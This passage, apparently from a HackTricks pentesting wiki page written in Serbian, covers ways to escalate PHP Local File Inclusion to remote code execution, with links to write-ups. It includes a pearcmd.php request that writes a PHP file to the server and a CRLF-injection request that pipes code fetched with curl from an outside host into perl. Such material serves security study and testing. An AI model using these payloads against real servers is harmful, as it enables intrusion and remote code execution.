{{#endref}}

### Putem temp file uploads u Windows

Ako pronađete **Local File Inclusion** i server radi na **Windows**, možda možete dobiti RCE:


{{#ref}}
lfi2rce-via-temp-file-uploads.md
{{#endref}}

### Putem `pearcmd.php` + URL args

Kao što je [**objašnjeno u ovom postu**](https://www.leavesongs.com/PENETRATION/docker-php-include-getshell.html#0x06-pearcmdphp), skripta `/usr/local/lib/phppearcmd.php` postoji po defaultu u php docker images. Štaviše, moguće je proslediti argumente skripti preko URL-a jer je naznačeno da ako URL param nema `=`, treba da bude korišćen kao argument. Pogledajte i [watchTowr’s write-up](https://labs.watchtowr.com/form-tools-we-need-to-talk-about-php/) i [Orange Tsai’s “Confusion Attacks”](https://blog.orange.tw/posts/2024-08-confusion-attacks-en/).

Sledeći zahtev kreira fajl u `/tmp/hello.php` sa sadržajem `<?=phpinfo()?>`:
```bash
GET /index.php?+config-create+/&file=/usr/local/lib/php/pearcmd.php&/<?=phpinfo()?>+/tmp/hello.php HTTP/1.1
```
U nastavku se zloupotrebljava CRLF vuln da bi se dobilo RCE (iz [**here**](https://blog.orange.tw/2024/08/confusion-attacks-en.html?m=1)):
```
http://server/cgi-bin/redir.cgi?r=http:// %0d%0a
Location:/ooo? %2b run-tests %2b -ui %2b $(curl${IFS}orange.tw/x|perl) %2b alltests.php %0d%0a
Content-Type:proxy:unix:/run/php/php-fpm.sock|fcgi://127.0.0.1/usr/local/lib/php/pearcmd.php %0d%0a
%0d%0a
```
### Putem phpinfo() (file_uploads = on)

Ako nađete **Local File Inclusion** i fajl koji izlaže **phpinfo()** sa file_uploads = on, možete dobiti RCE:


{{#ref}}
lfi2rce-via-phpinfo.md
{{#endref}}

### Putem compress.zlib + `PHP_STREAM_PREFER_STUDIO` + Path Disclosure

Ako nađete **Local File Inclusion** i možete **exfiltrate the path** privremenog fajla ALI **server** proverava da li **fajl koji treba da se uključi ima PHP marks**, možete pokušati da **bypass that check** ovom **Race Condition**:


{{#ref}}
lfi2rce-via-compress.zlib-+-php_stream_prefer_studio-+-path-disclosure.md
{{#endref}}

### Putem eternal waiting + bruteforce

Ako možete zloupotrebiti LFI da **upload temporary files** i naterate server da **hang** PHP izvršenje, onda možete **brute force filenames during hours** da biste pronašli privremeni fajl:


{{#ref}}
lfi2rce-via-eternal-waiting.md
{{#endref}}

### Do Fatal Error-a

Ako uključite bilo koji od fajlova `/usr/bin/phar`, `/usr/bin/phar7`, `/usr/bin/phar.phar7`, `/usr/bin/phar.phar`. (Morate uključiti isti fajl 2 puta da biste izazvali tu grešku).

**Ne znam koliko je ovo korisno, ali možda jeste.**\
_Čak i ako prouzrokujete PHP Fatal Error, PHP privremeni fajlovi koji su otpremljeni se brišu._

<figure><img src="../../images/image (1031).png" alt=""><figcaption></figcaption></figure>

## Reference

- [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion%20-%20Path%20Traversal)
- [PayloadsAllTheThings/tree/master/File%20Inclusion%20-%20Path%20Traversal/Intruders](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion%20-%20Path%20Traversal/Intruders)
- [Horizon3.ai – From Support Ticket to Zero Day (FreeFlow Core path traversal → arbitrary write → webshell)](https://horizon3.ai/attack-research/attack-blogs/from-support-ticket-to-zero-day/)
- [Xerox Security Bulletin 025-013 – FreeFlow Core 8.0.5](https://securitydocs.business.xerox.com/wp-content/uploads/2025/08/Xerox-Security-Bulletin-025-013-for-Freeflow-Core-8.0.5.pdf)
- [watchTowr – We need to talk about PHP (pearcmd.php gadget)](https://labs.watchtowr.com/form-tools-we-need-to-talk-about-php/)
- [Orange Tsai – Confusion Attacks on Apache](https://blog.orange.tw/posts/2024-08-confusion-attacks-en/)
- [VTENEXT 25.02 – a three-way path to RCE](https://blog.sicuranext.com/vtenext-25-02-a-three-way-path-to-rce/)

{{#file}}
EN-Local-File-Inclusion-1.pdf
{{#endfile}}

{{#include ../../banners/hacktricks-training.md}}
